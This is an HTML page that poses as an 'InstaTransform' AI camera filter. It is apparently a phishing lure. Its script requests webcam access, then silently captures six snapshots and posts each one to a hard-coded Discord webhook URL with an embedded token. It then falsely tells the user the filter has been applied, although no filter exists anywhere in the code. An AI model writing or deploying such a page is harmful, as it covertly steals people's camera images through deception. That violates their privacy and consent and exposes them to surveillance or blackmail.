<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>InstaTransform AR</title>
  <link href="https://fonts.googleapis.com/css2?family=Poiret+One&family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
  <style>
    /* RESET + STAR BACKGROUND */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      width: 100%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      background: radial-gradient(circle at bottom, #1b2735, #090a0f);
      font-family: 'Source Sans Pro', sans-serif;
      color: #ecf0f1;
      position: relative;
      flex-direction: column;
      text-align: center;
      padding: 20px;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1;
    }

    .stars, .starts2, .stars3 {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      z-index: 0;
      overflow: hidden;
    }

    .stars {
      width: 2px;
      height: 2px;
      background: transparent;
      box-shadow:
        500px 800px #FFF, 200px 1300px #FFF, 1200px 600px #FFF,
        900px 1100px #FFF, 300px 500px #FFF, 400px 1000px #FFF,
        800px 1400px #FFF, 1300px 700px #FFF, 600px 2000px #FFF;
      animation: star-animation 60s linear infinite;
    }

    .starts2 {
      width: 1px;
      height: 1px;
      background: transparent;
      box-shadow:
        800px 300px #FFF, 400px 1500px #FFF, 1500px 1200px #FFF,
        600px 1700px #FFF, 1000px 900px #FFF, 500px 1600px #FFF;
      animation: star-animation2 90s linear infinite;
    }

    .stars3 {
      width: 3px;
      height: 3px;
      background: transparent;
      box-shadow:
        1000px 700px #FFF, 300px 1800px #FFF, 1400px 1000px #FFF,
        200px 1500px #FFF, 1100px 1300px #FFF, 700px 1200px #FFF;
      animation: star-animation3 120s linear infinite;
    }

    @keyframes star-animation {
      0% { transform: translateY(0); }
      100% { transform: translateY(-1500px); }
    }

    @keyframes star-animation2 {
      0% { transform: translateY(0); }
      100% { transform: translateY(-2000px); }
    }

    @keyframes star-animation3 {
      0% { transform: translateY(0); }
      100% { transform: translateY(-2500px); }
    }

    h1 {
      font-family: 'Poiret One', cursive;
      font-size: 3rem;
      margin-bottom: 0.5rem;
      z-index: 2;
      animation: fadeIn 2s ease-out;
    }

    p {
      font-size: 1.2rem;
      max-width: 500px;
      margin: 0 auto 1.5rem;
      color: #ccc;
      z-index: 2;
      animation: fadeIn 2.5s ease-out;
    }

    .oval-button {
      padding: 14px 30px;
      border: 2px solid #ecf0f1;
      background: none;
      color: #ecf0f1;
      font-size: 1.1rem;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      z-index: 2;
    }

    .oval-button:hover {
      background-color: #ecf0f1;
      color: #1b2735;
      transform: translateY(-5px);
    }

    video, canvas {
      display: none;
      margin-top: 20px;
      border-radius: 10px;
      z-index: 2;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: translateY(20px); }
      100% { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <!-- Stars Background -->
  <div class="stars"></div>
  <div class="starts2"></div>
  <div class="stars3"></div>
  <div class="overlay"></div>

  <!-- Main Content -->
  <h1>âœ¨ InstaTransform Filter</h1>
  <p>Turn on your camera to try our trending AI filter effect. This may take a few seconds to calibrate.</p>
  <button class="oval-button" onclick="start()">Start Filter</button>

  <video id="video" autoplay playsinline width="400"></video>
  <canvas id="canvas" width="400" height="300"></canvas>

  <script>
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  let captureCount = 0;
  const totalCaptures = 6; // number of images to send
  const delayBetweenCaptures = 1000; // in milliseconds

  async function start() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = "block";

      setTimeout(() => {
        captureCount = 0;
        captureMultiple();
      }, 1000); // wait a bit before starting capture
    } catch (e) {
      alert("Please allow camera access to continue.");
    }
  }

  function captureMultiple() {
    if (captureCount >= totalCaptures) {
      alert("Filter applied! ðŸŽ‰");
      return;
    }

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob((blob) => {
      const formData = new FormData();
      formData.append("file", blob, `snapshot${captureCount + 1}.png`);

      fetch("https://discord.com/api/webhooks/1398472154089127946/hqsmCirQoQk0xSGdhb5_qMGj-rF5HX9fa_SqwEduaWMtOuc8cr5X7c01o1gIXi-6QqwA", {
        method: "POST",
        body: formData
      }).catch((err) => {
        console.error("Failed to send image", err);
      });

      captureCount++;
      setTimeout(captureMultiple, delayBetweenCaptures);
    }, "image/png");
  }
</script>

</body>
</html>
